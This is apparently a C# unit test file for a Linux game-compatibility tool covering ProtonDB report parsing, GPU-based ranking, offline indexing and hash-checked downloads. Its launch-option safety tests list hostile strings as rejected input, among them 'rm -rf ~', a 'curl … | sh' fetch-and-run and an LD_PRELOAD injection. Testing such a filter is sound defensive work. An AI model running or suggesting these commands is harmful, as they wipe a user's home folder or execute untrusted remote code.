// New Ilmenyx additions: see LICENSING.md. JSON samples copied from real responses (2026-11-06) and the ProtonDB export of 2026-11-01; no network is used.
using System.Formats.Tar;
using System.IO.Compression;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Ilmenyx.Core;
using Xunit;

namespace Ilmenyx.Tests;

public sealed class GameCompatTests : IDisposable
{
    private readonly string dir = Path.Combine(Path.GetTempPath(), "ilmenyx-compat-" + Guid.NewGuid().ToString("N"));
    public GameCompatTests() => Directory.CreateDirectory(dir);
    public void Dispose() { if (Directory.Exists(dir)) Directory.Delete(dir, true); }

    private const string Cs2Summary = "{\"bestReportedTier\":\"platinum\",\"confidence\":\"strong\",\"score\":0.72,\"tier\":\"gold\",\"total\":2071,\"trendingTier\":\"platinum\"}";
    private const string Cs2Deck = "{\"success\":1,\"results\":{\"appid\":730,\"resolved_category\":2,\"resolved_items\":[{\"display_type\":3,\"loc_token\":\"#SteamDeckVerified_TestResult_ControllerGlyphsDoNotMatchDeckDevice\"},{\"display_type\":4,\"loc_token\":\"#SteamDeckVerified_TestResult_DefaultConfigurationIsPerformant\"},{\"display_type\":3,\"loc_token\":\"#SteamDeckVerified_TestResult_SomethingNew\"}]}}";
    private const string AntiCheat = "[{\"name\":\"Apex Legends\",\"native\":false,\"status\":\"Denied\",\"anticheats\":[\"Easy Anti-Cheat\",\"Hyperion\"],\"updates\":[{\"name\":\"Linux support disabled\",\"date\":\"Oct 31, 2024\"}],\"storeIds\":{\"steam\":\"1172470\"}},"
        + "{\"name\":\"Counter-Strike\",\"native\":true,\"status\":\"Supported\",\"anticheats\":[\"VAC\"],\"updates\":[],\"storeIds\":{\"steam\":\"730\"}},{\"name\":\"New World\",\"status\":\"Denied\",\"anticheats\":[],\"storeIds\":{}}]";

    private static JsonElement El(string json) => JsonDocument.Parse(json).RootElement.Clone();

    // Shapes of real export entries (texts shortened); the numeric appId is how older entries store it.
    private const string ReportRx7900 = "{\"app\":{\"steam\":{\"appId\":\"1091500\"},\"title\":\"Cyberpunk 2077\"},\"responses\":{\"verdict\":\"yes\",\"customProtonVersion\":\"GE-Proton10-29\",\"stabilityFaults\":\"yes\",\"audioFaults\":\"no\","
        + "\"launchOptions\":\"PROTON_FSR4_RDNA3_UPGRADE=1 VKD3D_CONFIG=single_queue %command%\",\"notes\":{\"stabilityFaults\":\"Crashes were fixed by using VKD3D_CONFIG=single_queue\",\"verdict\":\"Works well.\"},\"concludingNotes\":\"Saved in /home/lucas/Games\\u0007 ok\"},"
        + "\"timestamp\":1793000000,\"systemInfo\":{\"gpu\":\"AMD Radeon RX 7900 XT (radeonsi, navi31, LLVM 17.0.6, DRM 3.56)\",\"gpuDriver\":\"4.6 Mesa 24.1\",\"os\":\"Nobara Linux 39 (KDE Plasma)\",\"kernel\":\"6.7.0\"}}";
    private const string ReportOldNumeric = "{\"app\":{\"steam\":{\"appId\":427510},\"title\":\"Old\"},\"responses\":{\"verdict\":\"no\"},\"timestamp\":1600000000,\"systemInfo\":{\"gpu\":\"NVIDIA GeForce GTX 1060 6GB\",\"gpuDriver\":\"NVIDIA 470.86\",\"os\":\"Ubuntu 20.04\"}}";

    [Fact]
    public void SummaryDeckAndAntiCheatParseRealResponses()
    {
        var s = ProtonSummary.Parse(Cs2Summary)!;
        Assert.Equal("gold", s.Tier); Assert.Equal(2071, s.Total); Assert.Equal("Ouro", ProtonSummary.TierName(s.Tier)); Assert.Equal("alta", ProtonSummary.ConfidenceName(s.Confidence));
        Assert.Null(ProtonSummary.Parse("<html>")); Assert.Null(ProtonSummary.Parse("{\"x\":1}"));
        var d = DeckStatus.Parse(Cs2Deck)!;
        Assert.Equal("Jogável", d.Name);
        Assert.Equal(["Os botões mostrados no jogo não são os do controle do Deck", "Bom desempenho na configuração padrão", "Something New"], d.Notes); // unknown token: readable, not dropped
        var ac = AntiCheatInfo.ParseAll(AntiCheat);
        Assert.Equal(2, ac.Count); // entries without a Steam id are not matched by name
        Assert.True(ac["1172470"].BlocksOnline); Assert.Equal(["Easy Anti-Cheat", "Hyperion"], ac["1172470"].AntiCheats); Assert.Equal("Linux support disabled", ac["1172470"].LastUpdate);
        Assert.False(ac["730"].BlocksOnline); Assert.True(ac["730"].Native);
    }

    [Fact]
    public void DumpEntryBecomesCompactPrivateReport()
    {
        var r = CompatReport.FromDump(El(ReportRx7900))!;
        Assert.Equal("1091500", r.AppId); Assert.True(r.Works); Assert.Equal("GE-Proton10-29", r.Proton);
        Assert.Equal(["stabilityFaults"], r.Faults); Assert.Equal("Crashes were fixed by using VKD3D_CONFIG=single_queue", r.FaultNotes["stabilityFaults"]); Assert.Equal("Works well.", r.VerdictNote);
        Assert.Equal("Saved in ~/Games ok", r.ConcludingNotes); // home folder hidden, control character removed
        Assert.Equal("427510", CompatReport.FromDump(El(ReportOldNumeric))!.AppId); // numeric appId of older entries
        Assert.Null(CompatReport.FromDump(El("{\"app\":{\"steam\":{\"appId\":\"../x\"}}}")));
        Assert.Equal(new string('a', 10) + "…", CompatText.Clean(new string('a', 30), 10));
    }

    [Theory]
    [InlineData("AMD Radeon 610M (radeonsi, raphael_mendocino, LLVM 20.1.2)", "610m", "mendocino")]
    [InlineData("AMD Radeon RX 7900 XT (radeonsi, navi31, LLVM 17.0.6)", "rx 7900 xt", "navi31")]
    [InlineData("NVIDIA GeForce RTX 3060 Ti/PCIe/SSE2", "rtx 3060 ti", null)]
    [InlineData("AMD Custom GPU 0405 (vangogh, LLVM 14.0.6)", null, "vangogh")]
    [InlineData("Mendocino (iGPU · Radeon 610M)", "610m", "mendocino")]
    public void GpuTokensFromRealStrings(string gpu, string? model, string? code)
    {
        var (models, codes) = CompatMatcher.Tokens(gpu);
        if (model is not null) Assert.Contains(model, models);
        if (code is not null) Assert.Contains(code, codes);
    }

    [Fact]
    public void RankingPrefersSameGpuThenChipThenVendorAndDistro()
    {
        var now = DateTimeOffset.FromUnixTimeSeconds(1793600000);
        var hw = new CompatHardware("AMD Mendocino (iGPU · Radeon 610M)", "Linux Mint 22.3", false);
        CompatReport R(string gpu, string os, long ts = 1793000000) => new() { AppId = "1", Gpu = gpu, Os = os, Timestamp = ts, Verdict = "yes", GpuDriver = "Mesa 25" };
        var same = CompatMatcher.Rank(R("AMD Radeon 610M (radeonsi, raphael_mendocino)", "Arch Linux"), hw, now);
        var vendor = CompatMatcher.Rank(R("AMD Radeon RX 6600 (radeonsi, navi23)", "Linux Mint 22.3"), hw, now);
        var other = CompatMatcher.Rank(R("NVIDIA GeForce RTX 4070", "Fedora 41", 1600000000) with { GpuDriver = "NVIDIA 560" }, hw, now);
        Assert.Contains("mesma GPU", same.Matches); Assert.Contains("mesma distro", vendor.Matches);
        Assert.True(same.Score > vendor.Score && vendor.Score > other.Score, $"{same.Score} {vendor.Score} {other.Score}");
        Assert.Equal("ubuntu", CompatMatcher.DistroFamily("Linux Mint 22.3")); Assert.Equal("arch", CompatMatcher.DistroFamily("SteamOS Holo")); Assert.Equal("fedora", CompatMatcher.DistroFamily("Nobara Linux 39"));
    }

    [Theory]
    [InlineData("PROTON_ENABLE_WAYLAND=1 %command%", true)]
    [InlineData("gamemoderun mangohud %command% -novid", true)]
    [InlineData("PROTON_FSR4_RDNA3_UPGRADE=1 VKD3D_CONFIG=single_queue gamescope -w 3440 -h 1440 -W 3440 -H 1440 -f --force-grab-cursor --mangoapp -- %command%", true)]
    [InlineData("--launcher-skip -fullscreen", true)]              // no %command%: Steam passes these to the game
    [InlineData("rm -rf ~; %command%", false)]
    [InlineData("curl http://x.y/s.sh | sh %command%", false)]
    [InlineData("LD_PRELOAD=$(pwd)/x.so %command%", false)]
    [InlineData("~/SwoftyLauncher/bin/swofty run -- %command%", false)]
    [InlineData("/usr/bin/evil %command%", false)]
    [InlineData("%command% %command%", false)]
    [InlineData("", false)]
    public void OnlyStrictLaunchOptionsCanBeApplied(string options, bool applicable) => Assert.Equal(applicable, LaunchOptionSafety.Check(options).Applicable);

    [Fact]
    public void SuggestionsCountOptionsAndProtonOfSimilarWorkingReports()
    {
        var now = DateTimeOffset.FromUnixTimeSeconds(1793600000);
        var hw = new CompatHardware("AMD Radeon RX 7900 XT", "Arch Linux", false);
        var reports = Enumerable.Range(0, 6).Select(i => new CompatReport
        {
            AppId = "1", Gpu = "AMD Radeon RX 7900 XT (radeonsi, navi31)", Os = "Arch Linux", Timestamp = 1793000000 - i, Verdict = i < 5 ? "yes" : "no",
            LaunchOptions = i < 3 ? "PROTON_ENABLE_WAYLAND=1 gamemoderun %command%" : i == 3 ? "rm -rf ~; %command%" : null, CustomProton = i < 2 ? "GE-Proton10-29" : null,
        }).ToList();
        var (options, protons) = CompatMatcher.Suggest(CompatMatcher.RankAll(reports, hw, now));
        Assert.Contains(options, o => o.Option == "PROTON_ENABLE_WAYLAND=1" && o.Count == 3 && o.Of == 5);
        Assert.Contains(options, o => o.Option == "gamemoderun" && o.Count == 3);
        Assert.DoesNotContain(options, o => o.Option.Contains("rm")); // unsafe options never feed suggestions
        Assert.Equal("GE-Proton10-29", protons.Single().Option);
    }

    private static byte[] TarGz(string json)
    {
        using var ms = new MemoryStream();
        using (var gz = new GZipStream(ms, CompressionLevel.Fastest, leaveOpen: true))
        using (var tar = new TarWriter(gz, TarEntryFormat.Pax, leaveOpen: true))
        {
            var entry = new PaxTarEntry(TarEntryType.RegularFile, "reports_piiremoved.json") { DataStream = new MemoryStream(Encoding.UTF8.GetBytes(json)) };
            tar.WriteEntry(entry);
        }
        return ms.ToArray();
    }

    [Fact]
    public async Task IndexIsBuiltFromAnExportAndSearchedWithoutNetwork()
    {
        var many = Enumerable.Range(0, CompatDatabase.MaxReportsPerApp + 15).Select(i => ReportRx7900.Replace("1793000000", (1700000000 + i).ToString()));
        string json = "[" + string.Join(",", many.Append(ReportOldNumeric).Append("{\"not\":\"a report\"}")) + "]";
        string folder = Path.Combine(dir, "compat");
        await using var s = new MemoryStream(TarGz(json));
        var meta = await CompatDatabase.BuildAsync(s, folder, new CompatDumpInfo("test.tar.gz", 1, "", "", null));
        Assert.Equal(2, meta.Apps); Assert.Equal(CompatDatabase.MaxReportsPerApp + 1, meta.Reports);
        var db = new CompatDatabase(folder);
        var reports = db.Reports("1091500");
        Assert.Equal(CompatDatabase.MaxReportsPerApp, reports.Count); Assert.Equal(1700000000 + CompatDatabase.MaxReportsPerApp + 14, reports[0].Timestamp); // newest kept, newest first
        Assert.Equal("1091500", db.Search("cyberpunk").Single().AppId); Assert.Equal("1091500", db.Search("CYBERPUNK-2077").Single().AppId);
        Assert.Equal("Old", db.Search("427510").Single().Title);
        Assert.Empty(db.Reports("999")); Assert.Empty(db.Reports("../../etc"));
        Assert.Equal("test.tar.gz", db.ReadMeta()!.Source);
        await using var bad = new MemoryStream(TarGz("[{\"x\":1}]"));
        await Assert.ThrowsAsync<InvalidDataException>(() => CompatDatabase.BuildAsync(bad, folder, new CompatDumpInfo("bad", 1, "", "", null)));
        Assert.Equal(2, new CompatDatabase(folder).ReadMeta()!.Apps); // a failed rebuild keeps the previous index
    }

    [Fact]
    public async Task IndexKeepsOlderReportsOfThisMachinesGpu()
    {
        string old610 = ReportRx7900.Replace("AMD Radeon RX 7900 XT (radeonsi, navi31, LLVM 17.0.6, DRM 3.56)", "AMD Radeon 610M (radeonsi, raphael_mendocino)").Replace("1793000000", "1500000000");
        var newer = Enumerable.Range(0, CompatDatabase.MaxReportsPerApp).Select(i => ReportRx7900.Replace("1793000000", (1700000000 + i).ToString()));
        string json = "[" + string.Join(",", newer.Prepend(old610)) + "]";
        var hw = new CompatHardware("AMD Mendocino (iGPU · Radeon 610M)", "Linux Mint 22.3", false);
        await using (var s = new MemoryStream(TarGz(json))) await CompatDatabase.BuildAsync(s, Path.Combine(dir, "plain"), new CompatDumpInfo("t", 1, "", "", null));
        await using (var s = new MemoryStream(TarGz(json))) await CompatDatabase.BuildAsync(s, Path.Combine(dir, "mine"), new CompatDumpInfo("t", 1, "", "", null), machine: hw);
        Assert.DoesNotContain(new CompatDatabase(Path.Combine(dir, "plain")).Reports("1091500"), r => r.Timestamp == 1500000000); // pushed out by 80 newer reports
        var mine = new CompatDatabase(Path.Combine(dir, "mine")).Reports("1091500");
        Assert.Equal(CompatDatabase.MaxReportsPerApp + 1, mine.Count); Assert.Contains(mine, r => r.Timestamp == 1500000000 && CompatMatcher.SameGpu(hw, r.Gpu));
    }

    private sealed class FakeHandler(Func<HttpRequestMessage, HttpResponseMessage> respond) : HttpMessageHandler
    {
        public List<string> Urls { get; } = [];
        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken ct) { Urls.Add(request.RequestUri!.ToString()); return Task.FromResult(respond(request)); }
    }

    [Fact]
    public async Task OnlineLookupsUseFixedHostsCacheForAWeekAndTreat404AsNoData()
    {
        var handler = new FakeHandler(req => req.RequestUri!.AbsolutePath switch
        {
            "/api/v1/reports/summaries/730.json" => new(HttpStatusCode.OK) { Content = new StringContent(Cs2Summary) },
            "/api/v1/reports/summaries/1.json" => new(HttpStatusCode.NotFound),
            "/saleaction/ajaxgetdeckappcompatibilityreport" => new(HttpStatusCode.OK) { Content = new StringContent(Cs2Deck) },
            _ => new(HttpStatusCode.OK) { Content = new StringContent(AntiCheat) },
        });
        var now = new DateTime(2026, 11, 6, 12, 0, 0, DateTimeKind.Utc);
        var online = new CompatOnline(dir, handler, () => now);
        Assert.Equal("gold", (await online.SummaryAsync("730"))!.Tier);
        Assert.Null(await online.SummaryAsync("1"));
        Assert.Equal(2, (await online.DeckAsync("730"))!.Category);
        Assert.Equal("Denied", (await online.AntiCheatAsync("1172470"))!.Status);
        Assert.Null(await online.AntiCheatAsync("12345"));
        int calls = handler.Urls.Count;
        await new CompatOnline(dir, handler, () => now.AddDays(6)).SummaryAsync("730"); Assert.Equal(calls, handler.Urls.Count); // cached
        await new CompatOnline(dir, handler, () => now.AddDays(6)).SummaryAsync("1"); Assert.Equal(calls, handler.Urls.Count);   // 404 cached too
        Assert.All(handler.Urls, u => Assert.Contains(new Uri(u).Host, CompatOnline.Hosts));
        await Assert.ThrowsAsync<ArgumentException>(() => online.SummaryAsync("730/../x"));
    }

    [Fact]
    public async Task ExportDownloadIsCheckedAgainstTheGitBlobSha()
    {
        byte[] body = TarGz("[" + ReportRx7900 + "]");
        string sha = Convert.ToHexStringLower(SHA1.HashData([.. Encoding.ASCII.GetBytes($"blob {body.Length}\0"), .. body]));
        string listing = JsonSerializer.Serialize(new[]
        {
            new { name = "reports_oct1_2026.tar.gz", size = 10L, sha = new string('a', 40), download_url = "https://raw.githubusercontent.com/bdefore/protondb-data/master/reports/reports_oct1_2026.tar.gz" },
            new { name = "reports_nov1_2026.tar.gz", size = (long)body.Length, sha, download_url = "https://raw.githubusercontent.com/bdefore/protondb-data/master/reports/reports_nov1_2026.tar.gz" },
            new { name = "evil.tar.gz", size = 1L, sha, download_url = "https://evil.example/x.tar.gz" },
        });
        var latest = CompatOnline.PickLatest(listing)!;
        Assert.Equal("reports_nov1_2026.tar.gz", latest.Name); Assert.Equal(new DateOnly(2026, 11, 1), latest.Date);
        var handler = new FakeHandler(req => req.RequestUri!.Host == "api.github.com" ? new(HttpStatusCode.OK) { Content = new StringContent(listing) } : new(HttpStatusCode.OK) { Content = new ByteArrayContent(body) });
        var db = new CompatDatabase(Path.Combine(dir, "db"));
        var meta = await new CompatOnline(dir, handler).UpdateDatabaseAsync(db);
        Assert.Equal(1, meta.Apps); Assert.Equal(sha, meta.GitSha);
        Assert.Empty(Directory.GetFiles(dir, "download-*")); // the export is deleted after indexing
        var tampered = new FakeHandler(req => req.RequestUri!.Host == "api.github.com" ? new(HttpStatusCode.OK) { Content = new StringContent(listing) } : new(HttpStatusCode.OK) { Content = new ByteArrayContent([.. body[..^1], (byte)(body[^1] ^ 1)]) });
        await Assert.ThrowsAsync<HttpRequestException>(() => new CompatOnline(dir, tampered).UpdateDatabaseAsync(db));
        Assert.Empty(Directory.GetFiles(dir, "download-*"));
    }
}
